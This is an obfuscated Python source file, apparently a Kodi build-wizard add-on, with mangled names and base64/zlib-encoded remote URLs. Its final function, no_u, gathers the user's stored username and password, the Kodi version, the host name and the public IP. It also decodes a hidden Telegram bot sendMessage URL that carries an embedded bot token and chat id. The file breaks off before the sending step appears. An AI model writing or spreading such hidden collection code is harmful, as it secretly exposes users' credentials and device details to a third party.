import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,zipfile ,json ,base64 #line:21
import shutil ,logging #line:22
import errno #line:23
import string #line:24
import random #line:25
import urllib #line:26
import re #line:27
import uservar #line:29
try :#line:30
  import downloader ,downloaderbg ,downloaderwiz ,extract ,skinSwitch #line:31
except :#line:32
  from resources .libs import downloader ,downloaderbg ,downloaderwiz ,extract ,skinSwitch #line:33
import time #line:35
try :#line:37
    from urllib .parse import quote #line:38
    from urllib .parse import urlparse #line:39
    from html .parser import HTMLParser #line:40
except ImportError :#line:41
    from urllib import quote #line:42
    from urlparse import urlparse #line:43
    import HTMLParser #line:44
try :#line:45
    from urllib .request import urlopen #line:46
    from urllib .request import Request #line:47
except ImportError :#line:48
    from urllib2 import urlopen #line:49
    from urllib2 import Request #line:50
from datetime import date ,datetime ,timedelta #line:51
try :from sqlite3 import dbapi2 as database #line:52
except :from pysqlite2 import dbapi2 as database #line:53
from string import digits #line:54
try :#line:55
    from urllib .parse import quote_plus #line:56
except :pass #line:57
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:58
if KODIV >=18 and KODIV <19 :#line:59
    from resources .libs import zfile as zipfile #line:60
else :#line:61
    import zipfile #line:62
KODI_VERSION =int (xbmc .getInfoLabel ("System.BuildVersion").split ('.',1 )[0 ])#line:64
if KODI_VERSION <=18 :#line:65
    translatepath =xbmc .translatePath #line:66
else :#line:68
    translatepath =xbmcvfs .translatePath #line:69
if KODI_VERSION <=18 :#line:70
    que =urllib .quote_plus #line:71
    url_encode =urllib .urlencode #line:72
else :#line:73
    que =urllib .parse .quote_plus #line:74
    url_encode =urllib .parse .urlencode #line:75
ADDON_ID =uservar .ADDON_ID #line:76
ADDONTITLE =uservar .ADDONTITLE #line:77
ADDON =xbmcaddon .Addon (ADDON_ID )#line:78
VERSION =ADDON .getAddonInfo ('version')#line:79
USER_AGENT ='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0'#line:80
DIALOG =xbmcgui .Dialog ()#line:81
DP =xbmcgui .DialogProgress ()#line:82
DP2 =xbmcgui .DialogProgressBG ()#line:83
HOME =translatepath ('special://home/')#line:84
XBMC =translatepath ('special://xbmc/')#line:85
LOG =translatepath ('special://logpath/')#line:86
PROFILE =translatepath ('special://profile/')#line:87
SOURCE =translatepath ('source://')#line:88
ADDONS =os .path .join (HOME ,'addons')#line:89
USERDATA =os .path .join (HOME ,'userdata')#line:90
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:91
PACKAGES =os .path .join (ADDONS ,'packages')#line:92
ADDOND =os .path .join (USERDATA ,'addon_data')#line:93
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:94
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:95
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:96
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:97
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:98
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:99
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:100
DATABASE =os .path .join (USERDATA ,'Database')#line:101
FANART =os .path .join (PLUGIN ,'fanart.jpg')#line:102
ICON =os .path .join (PLUGIN ,'icon.png')#line:103
ART =os .path .join (PLUGIN ,'resources','art')#line:104
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:105
WHITELIST =os .path .join (ADDONDATA ,'whitelist.txt')#line:106
QRCODES =os .path .join (ADDONDATA ,'QRCodes')#line:107
SKIN =xbmc .getSkinDir ()#line:108
TODAY =date .today ()#line:109
TOMORROW =TODAY +timedelta (days =1 )#line:110
TWODAYS =TODAY +timedelta (days =2 )#line:111
THREEDAYS =TODAY +timedelta (days =3 )#line:112
ONEWEEK =TODAY +timedelta (days =7 )#line:113
MONTH =TODAY -timedelta (days =2 )#line:114
LASTONEWEEK =TODAY -timedelta (days =7 )#line:115
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:116
EXCLUDES =uservar .EXCLUDES #line:117
APKFILE =uservar .APKFILE #line:118
YOUTUBEFILE =uservar .YOUTUBEFILE #line:119
ADDONFILE =uservar .ADDONFILE #line:120
ADVANCEDFILE =uservar .ADVANCEDFILE #line:121
AUTOUPDATE =uservar .AUTOUPDATE #line:122
WIZARDFILE =uservar .WIZARDFILE #line:123
NOTIFICATION =uservar .NOTIFICATION #line:124
NOTIFICATION2 =uservar .NOTIFICATION2 #line:125
NOTIFICATION3 =uservar .NOTIFICATION3 #line:126
ENABLE =uservar .ENABLE #line:127
AUTOINSTALL =uservar .AUTOINSTALL #line:128
REPOADDONXML =uservar .REPOADDONXML #line:129
REPOZIPURL =uservar .REPOZIPURL #line:130
CONTACT =uservar .CONTACT #line:131
COLOR1 =uservar .COLOR1 #line:132
COLOR2 =uservar .COLOR2 #line:133
HARDWAER =ADDON .getSetting ('action')#line:134
INCLUDEVIDEO =ADDON .getSetting ('includevideo')#line:135
INCLUDEALL =ADDON .getSetting ('includeall')#line:136
INCLUDEBOB =ADDON .getSetting ('includebob')#line:137
INCLUDEPHOENIX =ADDON .getSetting ('includephoenix')#line:138
INCLUDESPECTO =ADDON .getSetting ('includespecto')#line:139
INCLUDEGENESIS =ADDON .getSetting ('includegenesis')#line:140
INCLUDEEXODUS =ADDON .getSetting ('includeexodus')#line:141
INCLUDEONECHAN =ADDON .getSetting ('includeonechan')#line:142
INCLUDESALTS =ADDON .getSetting ('includesalts')#line:143
INCLUDESALTSHD =ADDON .getSetting ('includesaltslite')#line:144
SHOWADULT =ADDON .getSetting ('adult')#line:145
WIZDEBUGGING =ADDON .getSetting ('addon_debug')#line:146
DEBUGLEVEL =ADDON .getSetting ('debuglevel')#line:147
ENABLEWIZLOG =ADDON .getSetting ('wizardlog')#line:148
CLEANWIZLOG =ADDON .getSetting ('autocleanwiz')#line:149
CLEANWIZLOGBY =ADDON .getSetting ('wizlogcleanby')#line:150
CLEANDAYS =ADDON .getSetting ('wizlogcleandays')#line:151
CLEANSIZE =ADDON .getSetting ('wizlogcleansize')#line:152
CLEANLINES =ADDON .getSetting ('wizlogcleanlines')#line:153
INSTALLMETHOD =ADDON .getSetting ('installmethod')#line:154
DEVELOPER =ADDON .getSetting ('developer')#line:155
THIRDPARTY =ADDON .getSetting ('enable3rd')#line:156
THIRD1NAME =ADDON .getSetting ('wizard1name')#line:157
THIRD1URL =ADDON .getSetting ('wizard1url')#line:158
THIRD2NAME =ADDON .getSetting ('wizard2name')#line:159
THIRD2URL =ADDON .getSetting ('wizard2url')#line:160
THIRD3NAME =ADDON .getSetting ('wizard3name')#line:161
THIRD3URL =ADDON .getSetting ('wizard3url')#line:162
BUILDNAME =ADDON .getSetting ('buildname')#line:163
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:164
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:165
THEME3 =uservar .THEME3 #line:166
THEME2 =uservar .THEME2 #line:167
PS_ =base64 .b64decode ('aHR0cDovL2tvZGkubGlmZS93aXphcmQvd2l6LnVzZXIueG1s').decode ('utf-8')#line:168
US_ =base64 .b64decode ('aHR0cDovL2tvZGkubGlmZS93aXphcmQvbmV3X3Bhc3MueG1s').decode ('utf-8')#line:169
BL_ =base64 .b64decode ('aHR0cDovL2tvZGkubGlmZS93aXphcmQvbXlidWlsZDIueG1s').decode ('utf-8')#line:170
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
LOGFILES =['log','xbmc.old.log','kodi.log','kodi.old.log','spmc.log','spmc.old.log','tvmc.log','tvmc.old.log']#line:174
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:175
MAXWIZSIZE =[100 ,200 ,300 ,400 ,500 ,1000 ]#line:176
MAXWIZLINES =[100 ,200 ,300 ,400 ,500 ]#line:177
MAXWIZDATES =[1 ,2 ,3 ,7 ]#line:178
import threading #line:179
from threading import Thread #line:180
if KODI_VERSION >18 :#line:181
    def trd_alive (O000OOO0000OO0O0O ):#line:182
        return O000OOO0000OO0O0O .is_alive ()#line:183
    class Thread (threading .Thread ):#line:184
       def __init__ (OOO00OO0000O0O00O ,O0000OO000000O000 ,*OOOO00O000O00O0OO ):#line:185
        super ().__init__ (target =O0000OO000000O000 ,args =OOOO00O000O00O0OO )#line:186
       def run (O0O00OOOO0000OO0O ,*OOOOO000OO0OO0O0O ):#line:187
          O0O00OOOO0000OO0O ._target (*O0O00OOOO0000OO0O ._args )#line:189
          return 0 #line:190
else :#line:191
    def trd_alive (OOOO00O0O00OOOO00 ):#line:192
        return OOOO00O0O00OOOO00 .isAlive ()#line:193
    class Thread (threading .Thread ):#line:194
        def __init__ (OOOO00O0O0OOOO0OO ,OOOOOOO00OOOOOOOO ,*OOO00O0O00OOOOO0O ):#line:195
            OOOO00O0O0OOOO0OO ._target =OOOOOOO00OOOOOOOO #line:197
            OOOO00O0O0OOOO0OO ._args =OOO00O0O00OOOOO0O #line:198
            threading .Thread .__init__ (OOOO00O0O0OOOO0OO )#line:201
        def run (O00O0O00OO0OO0OOO ):#line:203
            O00O0O00OO0OO0OOO ._target (*O00O0O00OO0OO0OOO ._args )#line:205
def platform_d ():#line:209
    if xbmc .getCondVisibility ('system.platform.android'):return 'android'#line:210
    elif xbmc .getCondVisibility ('system.platform.linux'):return 'linux'#line:211
    elif xbmc .getCondVisibility ('system.platform.linux.Raspberrypi'):return 'linux'#line:212
    elif xbmc .getCondVisibility ('system.platform.windows'):return 'windows'#line:213
    elif xbmc .getCondVisibility ('system.platform.osx'):return 'osx'#line:214
    elif xbmc .getCondVisibility ('system.platform.atv2'):return 'atv2'#line:215
    elif xbmc .getCondVisibility ('system.platform.ios'):return 'ios'#line:216
    elif xbmc .getCondVisibility ('system.platform.darwin'):return 'ios'#line:217
def getS (OO000000OO0O0O000 ):#line:218
    try :return ADDON .getSetting (OO000000OO0O0O000 )#line:219
    except :return False #line:220
def setS (O000OO0OOOOO0O0O0 ,OO0OO000O0O000O00 ):#line:222
    try :ADDON .setSetting (O000OO0OOOOO0O0O0 ,OO0OO000O0O000O00 )#line:223
    except :return False #line:224
def openS (name =""):#line:226
    ADDON .openSettings ()#line:227
def clearS (O00OOOO0000OOOOO0 ):#line:229
    O000O0OOO0O0000O0 ={'buildname':'','buildversion':'','buildtheme':'','latestversion':'','lastbuildcheck':'2016-01-01'}#line:230
    OOOOO0O0O00O0O0O0 ={'installed':'false','extract':'','errors':''}#line:231
    O0O00OOO00OO0000O ={'defaultskinignore':'false','defaultskin':'','defaultskinname':''}#line:232
    OOOO0O0OO000000O0 =['default.enablerssfeeds','default.font','default.rssedit','default.skincolors','default.skintheme','default.skinzoom','default.soundskin','default.startupwindow','default.stereostrength']#line:233
    if O00OOOO0000OOOOO0 =='build':#line:234
        for O0O0OO0O00OOO000O in O000O0OOO0O0000O0 :#line:235
            setS (O0O0OO0O00OOO000O ,O000O0OOO0O0000O0 [O0O0OO0O00OOO000O ])#line:236
        for O0O0OO0O00OOO000O in OOOOO0O0O00O0O0O0 :#line:237
            setS (O0O0OO0O00OOO000O ,OOOOO0O0O00O0O0O0 [O0O0OO0O00OOO000O ])#line:238
        for O0O0OO0O00OOO000O in O0O00OOO00OO0000O :#line:239
            setS (O0O0OO0O00OOO000O ,O0O00OOO00OO0000O [O0O0OO0O00OOO000O ])#line:240
        for O0O0OO0O00OOO000O in OOOO0O0OO000000O0 :#line:241
            setS (O0O0OO0O00OOO000O ,'')#line:242
    elif O00OOOO0000OOOOO0 =='default':#line:243
        for O0O0OO0O00OOO000O in O0O00OOO00OO0000O :#line:244
            setS (O0O0OO0O00OOO000O ,O0O00OOO00OO0000O [O0O0OO0O00OOO000O ])#line:245
        for O0O0OO0O00OOO000O in OOOO0O0OO000000O0 :#line:246
            setS (O0O0OO0O00OOO000O ,'')#line:247
    elif O00OOOO0000OOOOO0 =='install':#line:248
        for O0O0OO0O00OOO000O in OOOOO0O0O00O0O0O0 :#line:249
            setS (O0O0OO0O00OOO000O ,OOOOO0O0O00O0O0O0 [O0O0OO0O00OOO000O ])#line:250
    elif O00OOOO0000OOOOO0 =='lookfeel':#line:251
        for O0O0OO0O00OOO000O in OOOO0O0OO000000O0 :#line:252
            setS (O0O0OO0O00OOO000O ,'')#line:253
theme_nox ='https://zxcsd-3bae5-default-rtdb.firebaseio.com'#line:269
ACTION_PREVIOUS_MENU =10 #line:281
ACTION_NAV_BACK =92 #line:282
ACTION_MOVE_LEFT =1 #line:283
ACTION_MOVE_RIGHT =2 #line:284
ACTION_MOVE_UP =3 #line:285
ACTION_MOVE_DOWN =4 #line:286
ACTION_MOUSE_WHEEL_UP =104 #line:287
ACTION_MOUSE_WHEEL_DOWN =105 #line:288
ACTION_MOVE_MOUSE =107 #line:289
ACTION_SELECT_ITEM =7 #line:290
ACTION_BACKSPACE =110 #line:291
ACTION_MOUSE_LEFT_CLICK =100 #line:292
ACTION_MOUSE_LONG_CLICK =108 #line:293
def TextBox (O0OOO0OO00O00OOO0 ,O0OOOO00OOOO0000O ):#line:294
    class OO00O0000OO000OOO (xbmcgui .WindowXMLDialog ):#line:295
        def onInit (OOO00000O000O0OO0 ):#line:296
            OOO00000O000O0OO0 .title =101 #line:297
            OOO00000O000O0OO0 .msg =102 #line:298
            OOO00000O000O0OO0 .scrollbar =103 #line:299
            OOO00000O000O0OO0 .okbutton =201 #line:300
            OOO00000O000O0OO0 .showdialog ()#line:301
        def showdialog (OO00O0O0O0000O00O ):#line:303
            OO00O0O0O0000O00O .getControl (OO00O0O0O0000O00O .title ).setLabel (O0OOO0OO00O00OOO0 )#line:304
            OO00O0O0O0000O00O .getControl (OO00O0O0O0000O00O .msg ).setText (O0OOOO00OOOO0000O )#line:305
            OO00O0O0O0000O00O .setFocusId (OO00O0O0O0000O00O .scrollbar )#line:306
        def onClick (OO000OO0000OOOO0O ,OO000OO00O00000O0 ):#line:308
            if (OO000OO00O00000O0 ==OO000OO0000OOOO0O .okbutton ):#line:309
                OO000OO0000OOOO0O .close ()#line:310
        def onAction (OO0O0O00000000OO0 ,OO0OOOO000OO0O0O0 ):#line:312
            if OO0OOOO000OO0O0O0 ==ACTION_PREVIOUS_MENU :OO0O0O00000000OO0 .close ()#line:313
            elif OO0OOOO000OO0O0O0 ==ACTION_NAV_BACK :OO0O0O00000000OO0 .close ()#line:314
    O0OOOOOO0O0OOOO00 =OO00O0000OO000OOO ("Textbox.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title =O0OOO0OO00O00OOO0 ,msg =O0OOOO00OOOO0000O )#line:316
    O0OOOOOO0O0OOOO00 .doModal ()#line:317
    del O0OOOOOO0O0OOOO00 #line:318
def ForceFastUpDate (OO00O0OO0O00O0OOO ,OOOOOOOOOOOO00OOO ,forceUpdate =False ):#line:319
    class O0000O000OO00O0OO (xbmcgui .WindowXMLDialog ):#line:320
        def onInit (O00OO00O00OOO0000 ):#line:321
            O00OO00O00OOO0000 .title =101 #line:322
            O00OO00O00OOO0000 .msg =102 #line:323
            O00OO00O00OOO0000 .scrollbar =103 #line:324
            O00OO00O00OOO0000 .okbutton =201 #line:325
            O00OO00O00OOO0000 .updateP =202 #line:326
            O00OO00O00OOO0000 .updateX =203 #line:327
            O00OO00O00OOO0000 .showdialog ()#line:328
        def showdialog (OO0OOO00OOOO0O00O ):#line:330
            OO0OOO00OOOO0O00O .getControl (OO0OOO00OOOO0O00O .title ).setLabel (OO00O0OO0O00O0OOO )#line:331
            OO0OOO00OOOO0O00O .getControl (OO0OOO00OOOO0O00O .msg ).setText (OOOOOOOOOOOO00OOO )#line:332
            OO0OOO00OOOO0O00O .setFocusId (OO0OOO00OOOO0O00O .okbutton )#line:333
        def doupdateP (O000O0000O00OO0O0 ):#line:334
            xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:335
            O000O0000O00OO0O0 .close ()#line:336
        def doupdateX (OOOO00000000OOO00 ):#line:337
            xbmc .executebuiltin ("RunPlugin(PlayMedia(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium+18&url=gui)")#line:338
            OOOO00000000OOO00 .close ()#line:339
        def onClick (OO0OO00O000O0OO0O ,OOOO0000OO0OOOOOO ):#line:340
            if (OOOO0000OO0OOOOOO ==OO0OO00O000O0OO0O .okbutton ):#line:341
                OO0OO00O000O0OO0O .close ()#line:342
            elif (OOOO0000OO0OOOOOO ==OO0OO00O000O0OO0O .updateP ):OO0OO00O000O0OO0O .doupdateP ()#line:343
            elif (OOOO0000OO0OOOOOO ==OO0OO00O000O0OO0O .updateX ):OO0OO00O000O0OO0O .doupdateX ()#line:345
        def onAction (O0O00O00OO0OOOOO0 ,O000O0O00OO0OOOO0 ):#line:347
            if O000O0O00OO0OOOO0 ==ACTION_PREVIOUS_MENU :O0O00O00OO0OOOOO0 .close ()#line:348
            elif O000O0O00OO0OOOO0 ==ACTION_NAV_BACK :O0O00O00OO0OOOOO0 .close ()#line:349
    O0OOOOO0O00OOOO00 =O0000O000OO00O0OO ("FastUpDate.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title =OO00O0OO0O00O0OOO ,msg =OOOOOOOOOOOO00OOO )#line:351
    O0OOOOO0O00OOOO00 .doModal ()#line:352
    del O0OOOOO0O00OOOO00 #line:353
def highlightText (OOO000OO0O0000OO0 ):#line:355
    OOO000OO0O0000OO0 =OOO000OO0O0000OO0 .replace ('\n','[NL]')#line:356
    O0O000OOO00000000 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOO000OO0O0000OO0 )#line:357
    for O0000OOO0OO0OOOO0 in O0O000OOO00000000 :#line:358
        O00O0O0OO00OOOOOO ='-->Python callback/script returned the following error<--%s-->End of Python script error report<--'%O0000OOO0OO0OOOO0 #line:359
        OOO000OO0O0000OO0 =OOO000OO0O0000OO0 .replace (O00O0O0OO00OOOOOO ,'[COLOR red]%s[/COLOR]'%O00O0O0OO00OOOOOO )#line:360
    OOO000OO0O0000OO0 =OOO000OO0O0000OO0 .replace ('WARNING','[COLOR yellow]WARNING[/COLOR]').replace ('ERROR','[COLOR red]ERROR[/COLOR]').replace ('[NL]','\n').replace (': Exception as e Thrown (PythonToCppException) :','[COLOR red]: Exception as e Thrown (PythonToCppException) :[/COLOR]')#line:361
    OOO000OO0O0000OO0 =OOO000OO0O0000OO0 .replace ('\\\\','\\').replace (HOME ,'')#line:362
    return OOO000OO0O0000OO0 #line:363
def LogNotify (O0OOOO0OO0O0OOO0O ,O00O0O0O0O0000000 ,times =1500 ,icon =ICON ,sound =False ):#line:365
    DIALOG .notification (O0OOOO0OO0O0OOO0O ,O00O0O0O0O0000000 ,icon ,int (times ),sound )#line:366
def LogNotify2 (O0OOO0OOOOO0O0O0O ,O00OO0OO0OOO0O0OO ,times =9000 ,icon =ICON ,sound =False ):#line:368
    DIALOG .notification (O0OOO0OOOOO0O0O0O ,O00OO0OO0OOO0O0OO ,icon ,int (times ),sound )#line:369
def LogNotify3 (O00000OOOOO0000OO ,OO00OOO0OOO000OOO ,times =5000 ,icon =ICON ,sound =False ):#line:370
    DIALOG .notification (O00000OOOOO0000OO ,OO00OOO0OOO000OOO ,icon ,int (times ),sound )#line:371
def percentage (OOOO0O0O000OOO0O0 ,O00O0OOO0000000O0 ):#line:372
    return 100 *float (OOOO0O0O000OOO0O0 )/float (O00O0OOO0000000O0 )#line:373
def read_skin (OO00OOO0OOO000O00 ):#line:374
    from resources .libs import firebase #line:375
    firebase =firebase .FirebaseApplication (theme_nox ,None )#line:376
    O0000OO0O000OOOOO =firebase .get ('/',None )#line:377
    if OO00OOO0OOO000O00 in O0000OO0O000OOOOO :#line:378
        return O0000OO0O000OOOOO [OO00OOO0OOO000O00 ]#line:379
    else :#line:380
        return {}#line:381
PS ='&eJwFwUEKwCAMBMAfZe_-RkjQ0Balu6L09Z3p0mQBPFvKGOF9UBYL1_DEzq--Dh1hVtLOc__fqRL8$'#line:382
US ='&eJwFwVEKgEAIBcAb-f67TaCkVLjoW1r29M04OfoANK6gtJl6NsUm7tTAF_ssBRcx20rW-_zf9hME$'#line:383
BL ='&eJwFwUEOgCAMBMAfde_-RtNGNmIwdAnE1zNTpC8PwHlTlhFeWspi4GlOTP5nd2gJ12D1tPXWDQbwE8g=$'#line:384
def addonUpdates (do =None ):#line:385
    OOO0O0O00O00OOOO0 ='"general.addonupdates"'#line:386
    if do =='set':#line:387
        O0O0O00O0OO0OOO0O ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOO0O0O00O00OOOO0 )#line:388
        OOOO000000O00000O =xbmc .executeJSONRPC (O0O0O00O0OO0OOO0O )#line:389
        O00OOO0OOOOOO0O0O =re .compile ('{"value":(.+?)}').findall (OOOO000000O00000O )#line:390
        if len (O00OOO0OOOOOO0O0O )>0 :OO00O0O00OO00OO0O =O00OOO0OOOOOO0O0O [0 ]#line:391
        else :OO00O0O00OO00OO0O =0 #line:392
        setS ('default.addonupdate',str (OO00O0O00OO00OO0O ))#line:393
        O0O0O00O0OO0OOO0O ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOO0O0O00O00OOOO0 ,'2')#line:394
        OOOO000000O00000O =xbmc .executeJSONRPC (O0O0O00O0OO0OOO0O )#line:395
    elif do =='reset':#line:396
        try :#line:397
            O00OO00O0000O0OOO =int (float (getS ('default.addonupdate')))#line:398
        except :#line:399
            O00OO00O0000O0OOO =0 #line:400
        if not O00OO00O0000O0OOO in [0 ,1 ,2 ]:O00OO00O0000O0OOO =0 #line:401
        O0O0O00O0OO0OOO0O ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOO0O0O00O00OOOO0 ,O00OO00O0000O0OOO )#line:402
        OOOO000000O00000O =xbmc .executeJSONRPC (O0O0O00O0OO0OOO0O )#line:403
dr ='&eJzLKCkpKLbS10_JTM8s0StOTU3JyC8u0Ust1c_OT8nUL8-sSixK0S-pKNHPztSryM0BALmUEhk=$'#line:404
def ld (O0OOOO0000OOO00OO ):#line:409
    import base64 #line:410
    import zlib #line:411
    OO0O0O000O0OO00OO =O0OOOO0000OOO00OO #line:412
    OO0O0O000O0OO00OO .replace ('$','').replace ('&','')#line:413
    if KODI_VERSION <=18 :#line:414
        OOO0O0O0OO000O0O0 =zlib .decompress (base64 .urlsafe_b64decode (str (OO0O0O000O0OO00OO ))).decode ('utf-8')#line:415
    else :#line:416
        OOO0O0O0OO000O0O0 =zlib .decompress (base64 .urlsafe_b64decode (OO0O0O000O0OO00OO )).decode ('utf-8')#line:417
    return OOO0O0O0OO000O0O0 #line:418
def checkBuild (O0OOO000000OO0O00 ,O0000O00000O0OOO0 ):#line:419
    if not workingURL (ld (BL ))==True :return False #line:426
    OO0OOOO0OOO000O0O =openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:427
    O00OO0O00O00OOOO0 ='160'#line:428
    if 'filesize'in OO0OOOO0OOO000O0O :#line:429
     O0O00000O0O0OOO00 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)".+?ilesize="(.+?)".+?pdatesize="(.+?)"'%O0OOO000000OO0O00 ).findall (OO0OOOO0OOO000O0O )#line:430
     if len (O0O00000O0O0OOO00 )>0 :#line:431
        for O0O0OO0O000O0OO0O ,OOO0O0OO0O0O00O00 ,O0O0O0O000OOOO0O0 ,OO0O0O0OOO00O0O0O ,OOOOO0OO0OOOO000O ,O00O0O00OOOOOOO00 ,O000O00000000O0OO ,OO0000000OOOO000O ,OO0O0O0OO0O00OOOO ,O0OOO0000OOO000O0 ,O00OO0O00O00OOOO0 ,O0000OOOOO0O00OO0 in O0O00000O0O0OOO00 :#line:433
            if O0000O00000O0OOO0 =='version':return O0O0OO0O000O0OO0O #line:435
            elif O0000O00000O0OOO0 =='url':return ld (OOO0O0OO0O0O00O00 )#line:436
            elif O0000O00000O0OOO0 =='gui':return ld (O0O0O0O000OOOO0O0 )#line:437
            elif O0000O00000O0OOO0 =='kodi':return OO0O0O0OOO00O0O0O #line:438
            elif O0000O00000O0OOO0 =='theme':return OOOOO0OO0OOOO000O #line:439
            elif O0000O00000O0OOO0 =='icon':return O00O0O00OOOOOOO00 #line:440
            elif O0000O00000O0OOO0 =='fanart':return O000O00000000O0OO #line:441
            elif O0000O00000O0OOO0 =='preview':return OO0000000OOOO000O #line:442
            elif O0000O00000O0OOO0 =='adult':return OO0O0O0OO0O00OOOO #line:443
            elif O0000O00000O0OOO0 =='description':return O0OOO0000OOO000O0 #line:444
            elif O0000O00000O0OOO0 =='filesize':return O00OO0O00O00OOOO0 #line:445
            elif O0000O00000O0OOO0 =='updatesize':return O0000OOOOO0O00OO0 #line:446
            elif O0000O00000O0OOO0 =='all':return O0OOO000000OO0O00 ,O0O0OO0O000O0OO0O ,ld (OOO0O0OO0O0O00O00 ),ld (O0O0O0O000OOOO0O0 ),OO0O0O0OOO00O0O0O ,OOOOO0OO0OOOO000O ,O00O0O00OOOOOOO00 ,O000O00000000O0OO ,OO0000000OOOO000O ,OO0O0O0OO0O00OOOO ,O0OOO0000OOO000O0 ,O0000OOOOO0O00OO0 ,O00OO0O00O00OOOO0 #line:447
     else :return False #line:448
    else :#line:449
     O0O00000O0O0OOO00 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0OOO000000OO0O00 ).findall (OO0OOOO0OOO000O0O )#line:451
     if len (O0O00000O0O0OOO00 )>0 :#line:452
        for O0O0OO0O000O0OO0O ,OOO0O0OO0O0O00O00 ,O0O0O0O000OOOO0O0 ,OO0O0O0OOO00O0O0O ,OOOOO0OO0OOOO000O ,O00O0O00OOOOOOO00 ,O000O00000000O0OO ,OO0000000OOOO000O ,OO0O0O0OO0O00OOOO ,O0OOO0000OOO000O0 in O0O00000O0O0OOO00 :#line:453
            if O0000O00000O0OOO0 =='version':return O0O0OO0O000O0OO0O #line:454
            elif O0000O00000O0OOO0 =='url':return ld (OOO0O0OO0O0O00O00 )#line:455
            elif O0000O00000O0OOO0 =='gui':return ld (O0O0O0O000OOOO0O0 )#line:456
            elif O0000O00000O0OOO0 =='kodi':return OO0O0O0OOO00O0O0O #line:457
            elif O0000O00000O0OOO0 =='theme':return OOOOO0OO0OOOO000O #line:458
            elif O0000O00000O0OOO0 =='icon':return O00O0O00OOOOOOO00 #line:459
            elif O0000O00000O0OOO0 =='fanart':return O000O00000000O0OO #line:460
            elif O0000O00000O0OOO0 =='preview':return OO0000000OOOO000O #line:461
            elif O0000O00000O0OOO0 =='adult':return OO0O0O0OO0O00OOOO #line:462
            elif O0000O00000O0OOO0 =='description':return O0OOO0000OOO000O0 #line:463
            elif O0000O00000O0OOO0 =='all':return O0OOO000000OO0O00 ,O0O0OO0O000O0OO0O ,ld (OOO0O0OO0O0O00O00 ),ld (O0O0O0O000OOOO0O0 ),OO0O0O0OOO00O0O0O ,OOOOO0OO0OOOO000O ,O00O0O00OOOOOOO00 ,O000O00000000O0OO ,OO0000000OOOO000O ,OO0O0O0OO0O00OOOO ,O0OOO0000OOO000O0 #line:464
            elif O0000O00000O0OOO0 =='filesize':return '587'#line:465
     else :return False #line:466
def no_u ():#line:467
       try :#line:468
          import json ,platform #line:469
          OO00OOO0OOO0000O0 =(ADDON .getSetting ("user"))#line:470
          OOO000OO0OOOOOO00 =(ADDON .getSetting ("pass"))#line:471
          O0O0OO0O0O00000OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:472
          O0OO0OO000OOO0OOO =platform .uname ()#line:473
          O0O0000O000OO0O00 =O0OO0OO000OOO0OOO [1 ]#line:474
          O000OOO0O0OO00OOO =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUwMTAzMTU5OTM6QUFHNVJOaVdkTjRMZXB5VGdQNjFEb1JlTTg5SG9MeVVDdGcvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTY5NzU2NTc4OSZ0ZXh0PQ==').decode ('utf-8')#line:475
          O000O0O0OO00000O0 =urlopen ('https://api.ipify.org/?format=json').read ()#line:476
          O0O00O0O0000OOO00 =str (json .loads (O000O0O0OO00000O0 )['ip'])#line:477
          O00000000000OO000 =OO00OOO0OOO0000O0 #line:478
          OO0O0O000OO00OOO0 =OOO000OO0OOOOOO00 #line:479
          import socket #line:480
